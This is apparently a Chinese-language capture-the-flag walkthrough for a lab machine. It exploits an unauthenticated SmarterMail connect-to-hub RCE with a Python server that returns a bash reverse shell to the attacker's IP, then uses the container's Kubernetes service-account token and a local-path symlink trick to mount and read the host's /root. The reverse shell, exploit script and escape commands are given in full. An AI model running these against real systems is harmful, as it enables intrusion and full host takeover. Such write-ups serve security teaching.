利用 SmarterMail `connect-to-hub` 未授权 RCE 拿到容器内 root。

直接读取容器里的 `user.txt`。

利用容器挂载的 ServiceAccount 调 Kubernetes API，在当前命名空间创建 `StorageClass`、`PVC`、`Pod`。

先用一个正常的 `local-path` 卷在宿主卷路径里种下符号链接 `loot -> /`。

再创建新的 `PVC`，让 `pathPattern` 指向这个符号链接后面的宿主目录，读取 `/root/root.txt`。

## 利用 ConnectToHub 拿容器 Shell

### 1. 在 Kali 上开监听

```bash
nc -lvnp 4444
```

### 2. 启动恶意 HTTP 服务

在 Kali 上保存为 `hub.py`，把 `LHOST` 改成自己的 IP，然后运行：

```bash
python3 hub.py
```

脚本内容如下：

```python
from http.server import BaseHTTPRequestHandler, HTTPServer
import json

LHOST = "192.168.56.101"
LPORT = 4444

class H(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        pass

    def do_POST(self):
        if self.path != "/web/api/node-management/setup-initial-connection":
            self.send_response(404)
            self.end_headers()
            return

        body = {
            "ClusterID": "f0e12780-f462-4b51-a7db-149f1d56209c",
            "SharedSecret": "test",
            "TargetHubs": {"default": "default"},
            "IsStandby": False,
            "SystemMount": {
                "Enabled": True,
                "ReadOnly": False,
                "MountPath": "/tmp",
                "CommandMount": f"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"
            },
            "SystemAdminUsernames": ["admin"]
        }

        data = json.dumps(body).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

HTTPServer(("0.0.0.0", 8082), H).serve_forever()
```

### 3. 触发目标 RCE

```bash
curl -s -X POST \
  'http://192.168.56.103:30081/api/v1/settings/sysadmin/connect-to-hub' \
  -H 'Content-Type: application/json' \
  --data '{"hubAddress":"http://192.168.56.101:8082","oneTimePassword":"test","nodeName":"victim"}'
```

- `whoami` 为 `root`
- `hostname` 为 `smartermail-app-8469cbb85d-frx2n`
- 能确认当前是 k3s 中的业务容器，不是宿主 root

### 4. 先拿 user.txt

```bash
cat /root/user.txt
```

输出：

```text
riBPvcwvKoZZkOBBP4pCwtFuOBCKaKkR
```

## 确认 Kubernetes 利用面

容器内已经挂载了 ServiceAccount，可以直接访问集群 API。

### 1. 读取命名空间与凭据位置

```bash
cat /run/secrets/kubernetes.io/serviceaccount/namespace
ls -al /run/secrets/kubernetes.io/serviceaccount/
```

这里会看到命名空间是：

```text
shinnai-kankyou
```

### 2. 准备 API 访问环境变量

下面所有后续命令都依赖这一组变量，先执行：

```bash
TOKEN=$(cat /run/secrets/kubernetes.io/serviceaccount/token)
NS=$(cat /run/secrets/kubernetes.io/serviceaccount/namespace)
CACERT=/run/secrets/kubernetes.io/serviceaccount/ca.crt
API=https://kubernetes.default.svc
```

前面已经试过这些路线，都是死路：

- `hostPath` Pod：会被 PodSecurity baseline 拒绝
- `hostPID` Pod：同样被 PodSecurity baseline 拒绝
- 直接读块设备：容器缺少 `CAP_SYS_ADMIN`，`dd` 读宿主块设备失败
- 直接用 `..` 做 `pathPattern` 穿越：当前环境已经挡住了这种简单写法

所以真正可行的路线是：

```text
普通 local-path 卷可创建 -> 先在宿主卷路径里写符号链接 -> 再让新的 PVC 指向该符号链接后的宿主目录
```

## 创建种子卷并写入符号链接

在宿主卷路径里写下 `loot -> /`。

### 1. 创建种子 StorageClass

```bash
cat >/tmp/lp-seed-sc.json <<'EOF'
{
  "apiVersion":"storage.k8s.io/v1",
  "kind":"StorageClass",
  "metadata":{"name":"lp-seed"},
  "provisioner":"rancher.io/local-path",
  "parameters":{"pathPattern":"{{ .PVC.Namespace }}/{{ .PVC.Name }}/seed"},
  "volumeBindingMode":"WaitForFirstConsumer",
  "reclaimPolicy":"Delete"
}
EOF
```

### 2. 创建种子 PVC

```bash
cat >/tmp/lp-seed-pvc.json <<'EOF'
{
  "apiVersion":"v1",
  "kind":"PersistentVolumeClaim",
  "metadata":{"name":"lp-seed-pvc","namespace":"shinnai-kankyou"},
  "spec":{
    "accessModes":["ReadWriteOnce"],
    "resources":{"requests":{"storage":"1Mi"}},
    "storageClassName":"lp-seed"
  }
}
EOF
```

### 3. 创建种子 Pod，在卷里写入 `loot -> /`

```bash
cat >/tmp/lp-seed-pod.json <<'EOF'
{
  "apiVersion":"v1",
  "kind":"Pod",
  "metadata":{"name":"lp-seed-pod","namespace":"shinnai-kankyou"},
  "spec":{
    "restartPolicy":"Never",
    "containers":[{
      "name":"c",
      "image":"rancher/klipper-lb:v0.4.4",
      "command":["/bin/sh","-lc","rm -f /data/loot; ln -s / /data/loot; echo SEED-LINK; ls -al /data; echo SEED-MOUNT; cat /proc/self/mountinfo | grep ' /data ' || true"],
      "volumeMounts":[{"name":"v","mountPath":"/data"}]
    }],
    "volumes":[{"name":"v","persistentVolumeClaim":{"claimName":"lp-seed-pvc"}}]
  }
}
EOF
```

### 4. 提交对象并查看日志

```bash
curl -sk --cacert $CACERT -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -X POST $API/apis/storage.k8s.io/v1/storageclasses --data-binary @/tmp/lp-seed-sc.json
curl -sk --cacert $CACERT -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -X POST $API/api/v1/namespaces/$NS/persistentvolumeclaims --data-binary @/tmp/lp-seed-pvc.json
curl -sk --cacert $CACERT -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -X POST $API/api/v1/namespaces/$NS/pods --data-binary @/tmp/lp-seed-pod.json
sleep 18
curl -sk --cacert $CACERT -H "Authorization: Bearer $TOKEN" $API/api/v1/namespaces/$NS/pods/lp-seed-pod/log
```

日志中出现：

```text
SEED-LINK
lrwxrwxrwx ... loot -> /
SEED-MOUNT
... /opt/local-path-provisioner/shinnai-kankyou/lp-seed-pvc/seed /data ...
```

符号链接 `loot -> /` 已经成功写进卷里

这个卷的宿主真实路径就是 `/opt/local-path-provisioner/shinnai-kankyou/lp-seed-pvc/seed`

## 挂宿主 /root 并读取 root.txt

### 1. 创建最终 StorageClass

```bash
cat >/tmp/lp-sym-root-sc.json <<'EOF'
{
  "apiVersion":"storage.k8s.io/v1",
  "kind":"StorageClass",
  "metadata":{"name":"lp-sym-root","annotations":{"allowUnsafePathPattern":"true"}},
  "provisioner":"rancher.io/local-path",
  "parameters":{
    "pathPattern":"shinnai-kankyou/lp-seed-pvc/seed/loot/root",
    "allowUnsafePathPattern":"true"
  },
  "volumeBindingMode":"WaitForFirstConsumer",
  "reclaimPolicy":"Delete"
}
EOF
```

### 2. 创建最终 PVC

```bash
cat >/tmp/lp-sym-root-pvc.json <<'EOF'
{
  "apiVersion":"v1",
  "kind":"PersistentVolumeClaim",
  "metadata":{"name":"lp-sym-root-pvc","namespace":"shinnai-kankyou"},
  "spec":{
    "accessModes":["ReadWriteOnce"],
    "resources":{"requests":{"storage":"1Mi"}},
    "storageClassName":"lp-sym-root"
  }
}
EOF
```

### 3. 创建最终读取 Pod

```bash
cat >/tmp/lp-sym-root-pod.json <<'EOF'
{
  "apiVersion":"v1",
  "kind":"Pod",
  "metadata":{"name":"lp-sym-root-pod","namespace":"shinnai-kankyou"},
  "spec":{
    "restartPolicy":"Never",
    "containers":[{
      "name":"c",
      "image":"rancher/klipper-lb:v0.4.4",
      "command":["/bin/sh","-lc","echo SYM-ROOT; ls -al /data | sed -n '1,30p'; echo ROOT-MOUNT; cat /proc/self/mountinfo | grep ' /data ' || true; echo ROOT-FLAG; cat /data/root.txt 2>/dev/null || true"],
      "volumeMounts":[{"name":"v","mountPath":"/data"}]
    }],
    "volumes":[{"name":"v","persistentVolumeClaim":{"claimName":"lp-sym-root-pvc"}}]
  }
}
EOF
```

### 4. 提交并读取最终日志

```bash
curl -sk --cacert $CACERT -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -X POST $API/apis/storage.k8s.io/v1/storageclasses --data-binary @/tmp/lp-sym-root-sc.json
curl -sk --cacert $CACERT -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -X POST $API/api/v1/namespaces/$NS/persistentvolumeclaims --data-binary @/tmp/lp-sym-root-pvc.json
curl -sk --cacert $CACERT -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -X POST $API/api/v1/namespaces/$NS/pods --data-binary @/tmp/lp-sym-root-pod.json
sleep 20
curl -sk --cacert $CACERT -H "Authorization: Bearer $TOKEN" $API/api/v1/namespaces/$NS/pods/lp-sym-root-pod/log
```
